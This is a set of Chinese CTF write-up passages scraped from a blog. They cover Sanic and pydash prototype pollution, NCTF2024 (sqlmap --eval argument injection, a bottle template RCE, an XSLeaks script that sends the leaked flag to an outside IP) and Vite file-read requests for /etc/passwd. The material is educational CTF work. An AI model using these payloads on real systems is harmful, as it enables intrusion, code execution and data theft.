__init__\\\\\\\\.__globals__ 回到src路由就可以看到，但是直接读flag是没有的，这也就是这题的考点所在了，需要我们利用污染的方式开启列目录功能，查看根目录下flag的名称，再进行读取\n有个非预期就是跟上面一样读环境变量\n1 2 3 app = Sanic(__name__) app.static(\u0026#34;/static/\u0026#34;, \u0026#34;./static/\u0026#34;) Session(app) 跟进static函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 def static( self, uri: str, file_or_directory: Union[PathLike, str], pattern: str = r\u0026#34;/?.+\u0026#34;, use_modified_since: bool = True, use_content_range: bool = False, stream_large_files: Union[bool, int] = False, name: str = \u0026#34;static\u0026#34;, host: Optional[str] = None, strict_slashes: Optional[bool] = None, content_type: Optional[str] = None, apply: bool = True, resource_type: Optional[str] = None, index: Optional[Union[str, Sequence[str]]] = None, directory_view: bool = False, directory_handler: Optional[DirectoryHandler] = None, ): \u0026#34;\u0026#34;\u0026#34;Register a root to serve files from. The input can either be a file or a directory. This method provides an easy and simple way to set up the route necessary to serve static files. Args: uri (str): URL path to be used for serving static content. file_or_directory (Union[PathLike, str]): Path to the static file or directory with static files. pattern (str, optional): Regex pattern identifying the valid static files. Defaults to `r\u0026#34;/?.+\u0026#34;`. use_modified_since (bool, optional): If true, send file modified time, and return not modified if the browser\u0026#39;s matches the server\u0026#39;s. Defaults to `True`. use_content_range (bool, optional): If true, process header for range requests and sends the file part that is requested. Defaults to `False`. stream_large_files (Union[bool, int], optional): If `True`, use the `StreamingHTTPResponse.file_stream` handler rather than the `HTTPResponse.file handler` to send the file. If this is an integer, it represents the threshold size to switch to `StreamingHTTPResponse.file_stream`. Defaults to `False`, which means that the response will not be streamed. name (str, optional): User-defined name used for url_for. Defaults to `\u0026#34;static\u0026#34;`. host (Optional[str], optional): Host IP or FQDN for the service to use. strict_slashes (Optional[bool], optional): Instruct Sanic to check if the request URLs need to terminate with a slash. content_type (Optional[str], optional): User-defined content type for header. apply (bool, optional): If true, will register the route immediately. Defaults to `True`. resource_type (Optional[str], optional): Explicitly declare a resource to be a `\u0026#34;file\u0026#34;` or a `\u0026#34;dir\u0026#34;`. index (Optional[Union[str, Sequence[str]]], optional): When exposing against a directory, index is the name that will be served as the default file. When multiple file names are passed, then they will be tried in order. directory_view (bool, optional): Whether to fallback to showing the directory viewer when exposing a directory. Defaults to `False`. directory_handler (Optional[DirectoryHandler], optional): An instance of DirectoryHandler that can be used for explicitly controlling and subclassing the behavior of the default directory handler. Returns: List[sanic.router.Route]: Routes registered on the router. Examples: Serving a single file: ```python app.static(\u0026#39;/foo\u0026#39;, \u0026#39;path/to/static/file.txt\u0026#39;) Serving all files from a directory: ```python app.static('/static', 'path/to/static/directory') ``` Serving large files with a specific threshold: ```python app.static('/static', 'path/to/large/files', stream_large_files=1000000) ``` \u0026quot;\u0026quot;\u0026quot; # noqa: E501 1 2 3 4 5 6 7 8 9 10 11 主要是这个注释 ​```python directory_view (bool, optional): Whether to fallback to showing the directory viewer when exposing a directory. Defaults to `False`. directory_handler (Optional[DirectoryHandler], optional): An instance of DirectoryHandler that can be used for explicitly controlling and subclassing the behavior of the default directory handler. 大致意思就是directory_view为True时，会开启列目录功能，directory_handler中可以获取指定的目录\n跟进directory_handler\n1 2 3 4 5 6 7 if not directory_handler: directory_handler = DirectoryHandler( uri=uri, directory=file_or_directory, directory_view=directory_view, index=index, ) 跟进DirectoryHandler这个类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 class DirectoryHandler: \u0026#34;\u0026#34;\u0026#34;Serve files from a directory. Args: uri (str): The URI to serve the files at. directory (Path): The directory to serve files from. directory_view (bool): Whether to show a directory listing or not. index (Optional[Union[str, Sequence[str]]]): The index file(s) to serve if the directory is requested. Defaults to None. \u0026#34;\u0026#34;\u0026#34; def __init__( self, uri: str, directory: Path, directory_view: bool = False, index: Optional[Union[str, Sequence[str]]] = None, ) -\u0026gt; None: if isinstance(index, str): index = [index] elif index is None: index = [] self.base = uri.strip(\u0026#34;/\u0026#34;) self.directory = directory self.directory_view = directory_view self.index = tuple(index) 我们只需要把directory污染成根目录，directory_view污染成True就能看到根目录文件了\n本地起一个调试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 from sanic import Sanic from sanic.response import text, html #from sanic_session import Session import sys import pydash # pydash==5.1.2 class Pollute: def __init__(self): pass app = Sanic(__name__) app.static(\u0026#34;/static/\u0026#34;, \u0026#34;./static/\u0026#34;) #Session(app) #@app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) #async def index(request): #return html(open(\u0026#39;static/index.html\u0026#39;).read()) #@app.route(\u0026#34;/login\u0026#34;) #async def login(request): #user = request.cookies.get(\u0026#34;user\u0026#34;) #if user.lower() == \u0026#39;adm;n\u0026#39;: #request.ctx.session[\u0026#39;admin\u0026#39;] = True #return text(\u0026#34;login success\u0026#34;) #return text(\u0026#34;login fail\u0026#34;) @app.route(\u0026#34;/src\u0026#34;) async def src(request): eval(request.args.get(\u0026#39;gxngxngxn\u0026#39;)) return text(open(__file__).read()) @app.route(\u0026#34;/admin\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) async def admin(request): key = request.json[\u0026#39;key\u0026#39;] value = request.json[\u0026#39;value\u0026#39;] if key and value and type(key) is str and \u0026#39;_.\u0026#39; not in key: pollute = Pollute() pydash.set_(pollute, key, value) return text(\u0026#34;success\u0026#34;) else: return text(\u0026#34;forbidden\u0026#34;) #print(app.router.name_index[\u0026#39;name\u0026#39;].directory_view) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) 经过查询资料可以发现，这个框架可以通过**app.router.name_index[\u0026lsquo;xxxxx\u0026rsquo;]**来获取注册的路由，我们可以打印看看\n回显路由\u0026quot;__mp_main__.static\u0026quot;\n接下来怎么调用到DirectoryHandler里呢? 我们可以全局搜索下name_index这个方法\n动调可以发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view\u0026#34;,\u0026#34;value\u0026#34;: true} 注意这里不能用[]来包裹其中的索引，污染和直接调用不同，我们需要用.来连接，而__mp_main.static是一个整体，不能分开，我们可以用两个反斜杠来转义就够了,可以看到是污染成功了，访问/static/，可以看到该目录下的文件\n接下来就是污染directory,如果直接污染会500，不能直接污染成字符串，我们要找到它是什么类型的\n跟进前下DirectoryHandler类下面的path\n可以看到parts的值最后是给了_parts这个属性，我们访问这个属性返回一个列表\n那么上面的污染直接污染成列表就行了\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory._parts\u0026#34;,\u0026#34;value\u0026#34;: [\u0026#34;/\u0026#34;]} 再访问static目录就能看到flag名了\n用上面方法污染读flag\n1 {\u0026#34;key\u0026#34;:\u0026#34;.__init__\\\\\\\\.__globals__\\\\\\\\.__file__\u0026#34;,\u0026#34;value\u0026#34;: \u0026#34;/24bcbd0192e591d6ded1_flag\u0026#34;} [DASCTF 2024暑期挑战赛｜为热爱，并肩作战]Sanic\u0026rsquo;s revenge 上面跟着gxngxngxn师傅的博客打的，他发现下面这个file_or_directory可以污染，像flask中的**_static_url_path**,污染了以后可以通过路由直接访问到文件\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.file_or_directory\u0026#34;,\u0026#34;value\u0026#34;: \u0026#34;/\u0026#34;} 先用pollute路由污染\n读/static/proc/1/cmdline\n看到start.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 from sanic import Sanic import os from sanic.response import text, html import sys import random import pydash # pydash==5.1.2 #源码好像被admin删掉了一些，听他说里面藏有大秘密 class Pollute: def __init__(self): pass def create_log_dir(n): ret = \u0026#34;\u0026#34; for i in range(n): num = random.randint(0, 9) letter = chr(random.randint(97, 122)) Letter = chr(random.randint(65, 90)) s = str(random.choice([num, letter, Letter])) ret += s return ret app = Sanic(__name__) app.static(\u0026#34;/static/\u0026#34;, \u0026#34;./static/\u0026#34;) @app.route(\u0026#34;/Wa58a1qEQ59857qQRPPQ\u0026#34;) async def secret(request): with open(\u0026#34;/h111int\u0026#34;,\u0026#39;r\u0026#39;) as f: hint=f.read() return text(hint) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) async def index(request): return html(open(\u0026#39;static/index.html\u0026#39;).read()) @app.route(\u0026#34;/adminLook\u0026#34;, methods=[\u0026#39;GET\u0026#39;]) async def AdminLook(request): #方便管理员查看非法日志 log_dir=os.popen(\u0026#39;ls /tmp -al\u0026#39;).read(); return text(log_dir) @app.route(\u0026#34;/pollute\u0026#34;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) async def POLLUTE(request): key = request.json[\u0026#39;key\u0026#39;] value = request.json[\u0026#39;value\u0026#39;] if key and value and type(key) is str and \u0026#39;parts\u0026#39; not in key and \u0026#39;proc\u0026#39; not in str(value) and type(value) is not list: pollute = Pollute() pydash.set_(pollute, key, value) return text(\u0026#34;success\u0026#34;) else: log_dir=create_log_dir(6) log_dir_bak=log_dir+\u0026#34;..\u0026#34; log_file=\u0026#34;/tmp/\u0026#34;+log_dir+\u0026#34;/access.log\u0026#34; log_file_bak=\u0026#34;/tmp/\u0026#34;+log_dir_bak+\u0026#34;/access.log.bak\u0026#34; log=\u0026#39;key: \u0026#39;+str(key)+\u0026#39;|\u0026#39;+\u0026#39;value: \u0026#39;+str(value); #生成日志文件 os.system(\u0026#34;mkdir /tmp/\u0026#34;+log_dir) with open(log_file, \u0026#39;w\u0026#39;) as f: f.write(log) #备份日志文件 os.system(\u0026#34;mkdir /tmp/\u0026#34;+log_dir_bak) with open(log_file_bak, \u0026#39;w\u0026#39;) as f: f.write(log) return text(\u0026#34;！！！此地禁止胡来，你的非法操作已经被记录！！！\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) 可以看到多出来的路由:Wa58a1qEQ59857qQRPPQ，我们直接访问得到hint：\n1 2 flag in /app,but you need to find his name！！！ Find a way to see the file names in the app directory 那么很明显我们需要想办法列出app目录下的文件\n还看到adminLook路由可以看到/tmp目录下的文件，而我们的非法日志就记录在此目录下，我们先随便触发一次非法记录,就是比如把key的值用列表传，\n接着访问adminLook路由\n出现日志目录，那么就可以利用访问这个目录实现穿越到上层目录：\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.file_or_directory\u0026#34;,\u0026#34;value\u0026#34;: \u0026#34;/tmp\u0026#34;} 首先切换到tmp目录下，再污染base的值:\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.base\u0026#34;,\u0026#34;value\u0026#34;: \u0026#34;static/YPdeyP\u0026#34;} 同时记得开启列目录功能:\n1 {\u0026#34;key\u0026#34;:\u0026#34;__class__\\\\\\\\.__init__\\\\\\\\.__globals__\\\\\\\\.app.router.name_index.__mp_main__\\\\.static.handler.keywords.directory_handler.directory_view\u0026#34;,\u0026#34;value\u0026#34;: true} 接着访问/static/YPdeyP../就能看到flag名字，接着再污染回根目录，然后访问static/app/45W698WqtsgQT1_flag就行了\n接下来分析原理\n前面用到这个static.handler，首先是根基static函数，之后跟进DirectoryHandler类\n1 2 3 4 if self.directory_view: return self._index( self.directory / current, path, request.app.debug ) 开启列目录功能后，就会调用_index方法\n1 2 3 4 5 6 7 8 9 10 def _index(self, location: Path, path: str, debug: bool): # Remove empty path elements, append slash if \u0026#34;//\u0026#34; in path or not path.endswith(\u0026#34;/\u0026#34;): return redirect( \u0026#34;/\u0026#34; + \u0026#34;\u0026#34;.join([f\u0026#34;{p}/\u0026#34; for p in path.split(\u0026#34;/\u0026#34;) if p]) ) # Render file browser page = DirectoryPage(self._iter_files(location), path, debug) return html(page.render()) 看到这里列出的目录路径就是由self.directory(这玩意是个对象，这里的值是其中的parts控制的)+current拼接得到的,如果我能控制current的值，例如为\u0026quot;..\u0026quot;，那这样不就可以实现目录穿越，直接列出上层目录下的文件了\n1 current = path.strip(\u0026#34;/\u0026#34;)[len(self.base) :].strip(\u0026#34;/\u0026#34;) # noqa: E203 这里path在被分割的时候有个情况，就是将路径从base字符串结尾开始的所有字符串去掉头尾的'/'字符后返回，也就是说，当我们把base属性污染成指定的字符串之后，后面如果出现了两个点，也就是..就说明了current返回的字符串可能存在路径穿越。\n要想让current变成..，就得访问一个目录,如果我们直接访问/static/ctf../\n此时的base是static,而current是ctf..\n显然我们控制base为static/ctf,那么ctf就会为..了\n所以可以先污染base成static/ctf,接着再访问static/ctf../就能实现目录穿越\n","date":"2025-03-27T00:00:00Z","image":"https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png","permalink":"https://0d000721999.github.io/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","title":"python原型链污染"},{"content":"NCTF2024复现 sqlmap-master 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 from fastapi import FastAPI, Request from fastapi.responses import FileResponse, StreamingResponse import subprocess app = FastAPI() @app.get(\u0026#34;/\u0026#34;) async def index(): return FileResponse(\u0026#34;index.html\u0026#34;) @app.post(\u0026#34;/run\u0026#34;) async def run(request: Request): data = await request.json() url = data.get(\u0026#34;url\u0026#34;) if not url: return {\u0026#34;error\u0026#34;: \u0026#34;URL is required\u0026#34;} command = f\u0026#39;sqlmap -u {url} --batch --flush-session\u0026#39; def generate(): process = subprocess.Popen( command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=False ) while True: output = process.stdout.readline() if output == \u0026#39;\u0026#39; and process.poll() is not None: break if output: yield output return StreamingResponse(generate(), media_type=\u0026#34;text/plain\u0026#34;) 由于shell=False不能进行常规的命令注入\n但是仔细观察可以发现我们还是可以控制 sqlmap 的参数, 即参数注⼊\n查看GTFOBins: https://gtfobins.github.io/gtfobins/sqlmap/\n可以用eval参数来执行python代码\n由于shell设置为false我们不能用单双引号，不然就变成eval字符串了\npayload\n1 127.0.0.1:8000 --eval __import__(\u0026#39;os\u0026#39;).system(\u0026#39;env\u0026#39;) 1 127.0.0.1 --eval=print(__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;env\u0026#39;).read()) 或者用转编码的方式\n1 127.0.0.1:8000 --eval exec(bytes.fromhex(\u0026#39;5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729\u0026#39;)) 1 127.0.0.1:8000 --eval=exec(__import__(\u0026#39;base64\u0026#39;).b64decode(\u0026#39;aW1wb3J0IG9zOyBwcmludChvcy5nZXRlbnYoJ0ZMQUcnKSk=\u0026#39;)) 或者-c参数读环境变量\n1 127.0.0.1:8000 -c /proc/self/environ ez_dash\u0026amp;ez_dash_revenge 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 \u0026#39;\u0026#39;\u0026#39; Hints: Flag在环境变量中 \u0026#39;\u0026#39;\u0026#39; from typing import Optional import pydash import bottle __forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, \u0026#34;Optional\u0026#34;,\u0026#34;func\u0026#34;,\u0026#34;render\u0026#34;, ] __forbidden_name__=[ \u0026#34;bottle\u0026#34; ] __forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False for word in __forbidden_name__: if name==word: return False for word in __forbidden_path__: if path.find(word)\u0026gt;=0: return False obj=globals()[name] try: pydash.set_(obj,path,value) except: return False return True @bottle.post(\u0026#39;/setValue\u0026#39;) def set_value(): name = bottle.request.query.get(\u0026#39;name\u0026#39;) path=bottle.request.json.get(\u0026#39;path\u0026#39;) if not isinstance(path,str): return \u0026#34;no\u0026#34; if len(name)\u0026gt;6 or len(path)\u0026gt;32: return \u0026#34;no\u0026#34; value=bottle.request.json.get(\u0026#39;value\u0026#39;) return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; @bottle.get(\u0026#39;/render\u0026#39;) def render_template(): path=bottle.request.query.get(\u0026#39;path\u0026#39;) if path.find(\u0026#34;{\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;}\u0026#34;)\u0026gt;=0 or path.find(\u0026#34;.\u0026#34;)\u0026gt;=0: return \u0026#34;Hacker\u0026#34; return bottle.template(path) bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 预期是利用pydash实现污染bottle.TEMPLATE_PATH，读取环境变量\n但是最后只过滤bottle的花括号，上次ghctf用\u0026lt;% %\u0026gt;绕过过滤，这里同样可以，实现非预期了\n因为题目上来就是404，打abort回显\n1 2 3 4 \u0026lt;% from bottle import abort from subprocess import getoutput a=getoutput(\u0026#34;env\u0026#34;) abort(404,a) %\u0026gt; 1 2 3 /render?path= \u0026lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput% 0aa=getoutput(\u0026#34;env\u0026#34;)%0aabort(404,a)%20%\u0026gt; 预期解\n正常来说render路由只会渲染文件，不能渲染字符串\n我们跟进bottle.template函数看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 def template(*args, **kwargs): \u0026#34;\u0026#34;\u0026#34; Get a rendered template as a string iterator. You can use a name, a filename or a template string as first parameter. Template rendering arguments can be passed as dictionaries or directly (as keyword arguments). \u0026#34;\u0026#34;\u0026#34; tpl = args[0] if args else None for dictarg in args[1:]: kwargs.update(dictarg) adapter = kwargs.pop(\u0026#39;template_adapter\u0026#39;, SimpleTemplate) lookup = kwargs.pop(\u0026#39;template_lookup\u0026#39;, TEMPLATE_PATH) tplid = (id(lookup), tpl) if tplid not in TEMPLATES or DEBUG: settings = kwargs.pop(\u0026#39;template_settings\u0026#39;, {}) if isinstance(tpl, adapter): TEMPLATES[tplid] = tpl if settings: TEMPLATES[tplid].prepare(**settings) elif \u0026#34;\\n\u0026#34; in tpl or \u0026#34;{\u0026#34; in tpl or \u0026#34;%\u0026#34; in tpl or \u0026#39;$\u0026#39; in tpl: TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings) else: TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings) if not TEMPLATES[tplid]: abort(500, \u0026#39;Template (%s) not found\u0026#39; % tpl) return TEMPLATES[tplid].render(kwargs) 可以发现如果tpl如果含有\\n、{、%、$的能够加入TEMPLATES[tplid]，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而tpl是我们传入的第一个参数\n它会根据TEMPLATE_PATH里去找到：\n1 2 3 4 TEMPLATE_PATH = [\u0026#39;./\u0026#39;, \u0026#39;./views/\u0026#39;] TEMPLATES = {} DEBUG = False NORUN = False # If set, run() does nothing. Used by load_app() 跟进lookup找到一个search方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @classmethod def search(cls, name, lookup=None): \u0026#34;\u0026#34;\u0026#34; Search name in all directories specified in lookup. First without, then with common extensions. Return first hit. \u0026#34;\u0026#34;\u0026#34; if not lookup: raise depr(0, 12, \u0026#34;Empty template lookup path.\u0026#34;, \u0026#34;Configure a template lookup path.\u0026#34;) if os.path.isabs(name): raise depr(0, 12, \u0026#34;Use of absolute path for template name.\u0026#34;, \u0026#34;Refer to templates with names or paths relative to the lookup path.\u0026#34;) for spath in lookup: spath = os.path.abspath(spath) + os.sep fname = os.path.abspath(os.path.join(spath, name)) if not fname.startswith(spath): continue if os.path.isfile(fname): return fname for ext in cls.extensions: if os.path.isfile(\u0026#39;%s.%s\u0026#39; % (fname, ext)): return \u0026#39;%s.%s\u0026#39; % (fname, ext) 它会去搜索TEMPLATE_PATH下的文件(应该)，理论上只需要污染TEMPLATE_PATH就能够做到任意文件读取\n但是高版本的pydash不能直接通过__globals__去获得bottle,在pydash 5.1.2版本中能够使用__globals__，但是高版本下已经被修复了，现在会报access to restricted key __globals__\n因此我们要想办法绕过restricted key\n去查看源码，在helpers.py下面找到\n1 2 3 4 def _raise_if_restricted_key(key): # Prevent access to restricted keys for security reasons. if key in RESTRICTED_KEYS: raise KeyError(f\u0026#34;access to restricted key {key!r} is not allowed\u0026#34;) 可以发现该异常只有输入在RESTRICTED_KEYS中的内容时才会触发\n又看到这一行\n1 RESTRICTED_KEYS = (\u0026#34;__globals__\u0026#34;, \u0026#34;__builtins__\u0026#34;) 理论上可以通过pydash自己污染掉RESTRICTED_KEYS从而使用globals：\n1 2 3 4 { \u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;, \u0026#34;value\u0026#34;:[] } 污染成功后再污染TEMPLATE_PATH即可：\n1 2 3 4 5 6 7 8 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[ \u0026#34;./\u0026#34;, \u0026#34;./views/\u0026#34;, \u0026#34;/proc/self\u0026#34; ] } 或者直接\n1 2 3 4 5 6 { \u0026#34;path\u0026#34;:\u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;, \u0026#34;value\u0026#34;:[ \u0026#34;/proc/self\u0026#34; ] } 最后用render路由渲染environ就行了\n1 /render?path=environ 用bp一步步改可以，注意下面传参是json格式\n或者直接上脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import requests,re url = \u0026#34;http://39.106.16.204:55285/\u0026#34; a1 = requests.post(url+\u0026#34;setValue?name=pydash\u0026#34;,json={\u0026#34;path\u0026#34;: \u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\u0026#34;value\u0026#34;:[]}) print(a1.text) a2 = requests.post(url+\u0026#34;setValue?name=setval\u0026#34;,json={\u0026#34;path\u0026#34;: \u0026#34;__globals__.bottle.TEMPLATE_PATH\u0026#34;,\u0026#34;value\u0026#34;:[\u0026#34;/proc/self\u0026#34;]}) print(a2.text) a3 = requests.get(url+\u0026#34;/render?path=environ\u0026#34;) print(a3.text) pattern = r\u0026#39;NCTF\\{[0-9a-fA-F-]+\\}\u0026#39; match = re.search(pattern, a3.text) if match: print(\u0026#34;找到的FLAG:\u0026#34;, match.group()) else: print(\u0026#34;未找到FLAG\u0026#34;) internal_api 题目给了hint\n1 2 注意 search 路由查询成功和失败 (Ok 和 Err) 时返回的 HTTP 状态码 XSLeaks 附件是一个rust写的search api\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 pub async fn private_search( Query(search): Query\u0026lt;Search\u0026gt;, State(pool): State\u0026lt;Arc\u0026lt;DbPool\u0026gt;\u0026gt;, ConnectInfo(addr): ConnectInfo\u0026lt;SocketAddr\u0026gt;, ) -\u0026gt; Result\u0026lt;Json\u0026lt;Vec\u0026lt;String\u0026gt;\u0026gt;, AppError\u0026gt; { // 以下两个 if 与题目无关, 你只需要知道: private_search 路由仅有 bot 才能访问 // 本地环境 (docker compose) let bot_ip = tokio::net::lookup_host(\u0026#34;bot:4444\u0026#34;).await?.next().unwrap(); if addr.ip() != bot_ip.ip() { return Err(anyhow!(\u0026#34;only bot can access\u0026#34;).into()); } // 远程环境 (k8s) // if !addr.ip().is_loopback() { // return Err(anyhow!(\u0026#34;only bot can access\u0026#34;).into()); // } let conn = pool.get()?; let comments = db::search(conn, search.s, true)?; if comments.len() \u0026gt; 0 { Ok(Json(comments)) } else { Err(anyhow!(\u0026#34;No comments found\u0026#34;).into()) } } /internal/search 路由仅允许 bot 访问, 同时其 db::search 的第三个参数传入了 true, 代表允许搜索 hidden comments (flag)\n如果能搜到 comments, 返回 OK() (200), 否则返回 Err() (500)\n我们要让bot去访问private_search查询flag，另外一个路由/report派上了用场，/report能够让bot去访问你提供的一个链接，因此可以尝试通过report来访问private_search\nxsleaks可以用于探测用户敏感信息，可以使用的场景较少，需要满足：\n页面存在xss 不同用户查询的结果集不同，并且有一个类似flag的字符串 网站存在一个模糊查找功能 构成二元结果并且能够成功探测到 而题目中满足的条件有：\n环境出网，bot可以访问自己的vps链接，可以导致xss admin可以查到flag，而我们只能够查到普通评论 查询成功时状态码是200，不存在该结果时返回结果500(题目提示的注意http状态码，可以通过burp抓包查询简单看到) 存在模糊查询(具体看SQL语句有LIKE进行模糊匹配)\n这是一个很经典的 XSLeaks 题目, 根据 https://xsleaks.dev/, 结合以上不同的 HTTP 状态码, 可以利用 onload 和 onerror 事件 leak flag\n1 查询成功200，查询失败500，可以通过onload，onerror事件区分，onload时能够fetch自己的vps发送请求带出flag(类似盲注的思路) 写一个html的exp在vps上起一个服务，然后vps起个监听(要用python的监听)\n1 python3 -m http.server 2333 在题目的report路由访问vps下的html文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \u0026lt;script\u0026gt; function probeError(flag) { let url = \u0026#39;http://127.0.0.1:8000/internal/search?s=\u0026#39; + flag; let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; { fetch(\u0026#39;http://47.122.53.248:2333/?flag=\u0026#39; + flag, { mode: \u0026#39;no-cors\u0026#39; }); leak(flag); script.remove(); }; script.onerror = () =\u0026gt; script.remove(); document.head.appendChild(script); } let dicts = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789-{}\u0026#39;; function leak(flag) { for (let i = 0; i \u0026lt; dicts.length; i++) { let char = dicts[i]; probeError(flag + char); } } leak(\u0026#39;nctf{\u0026#39;); \u0026lt;/script\u0026gt; ","date":"2025-03-25T00:00:00Z","image":"https://0d000721999.github.io/1.jpg","permalink":"https://0d000721999.github.io/p/2024nctf%E5%A4%8D%E7%8E%B0/","title":"2024NCTF复现"},{"content":"Vite任意文件读取漏洞 三个洞，TGCTF出了三个题\nCVE-2025-30208 Vite 开发服务器提供 @fs 机制，用于防止访问 Vite 允许列表之外的文件。然而，由于 URL 解析时的正则表达式处理不当，攻击者可以通过 ?raw?? 或 ?import\u0026amp;raw?? 等查询参数绕过访问限制，从而读取任意文件。\n在 Vite 服务器的 URL 处理逻辑中，@fs 机制原本用于限制对非白名单目录的访问\n1 2 3 4 5 server: { fs: { allow: [path.resolve(__dirname, \u0026#39;src\u0026#39;)] } } Vite 在 URL 解析过程中会移除部分特殊字符，而未正确考虑查询参数的影响，导致攻击者可以构造类似如下的请求绕过安全检查\n1 2 3 4 GET /etc/passwd?raw?? GET /etc/passwd?import\u0026amp;raw?? GET /@fs/etc/passwd?raw?? GET /@fs/etc/passwd?import\u0026amp;raw?? 由于 Vite 解析 URL 时未正确处理这些参数，导致绕过 server.fs.allow 限制，并返回任意文件内容。\n甚至有exp工具：GitHub - ThumpBo/CVE-2025-30208-EXP: CVE-2025-30208-EXP\n[TGCTF]前端GAME 源码读到flag在flag在根目录下/tgflagggg中，直接上poc\n1 2 